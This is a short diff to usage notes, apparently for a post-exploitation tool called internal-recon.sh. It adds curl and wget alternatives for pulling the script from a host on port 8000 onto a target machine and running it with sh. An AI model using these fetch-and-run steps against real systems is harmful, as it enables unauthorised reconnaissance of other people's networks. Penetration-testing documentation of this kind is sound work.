@@ -16,7 +16,9 @@ Local network:
 # Host
 sh internal-recon.sh -w
 # Target
-curl -LJO <Host>:8000/internal-recon.sh
+curl -LJO <Host>:8000/internal-recon.sh #or
+curl <Host>:8000/internal-recon.sh > internal-recon.sh #or
+wget <Host>:8000/internal-recon.sh
 sh internal-recon.sh
 ```
 
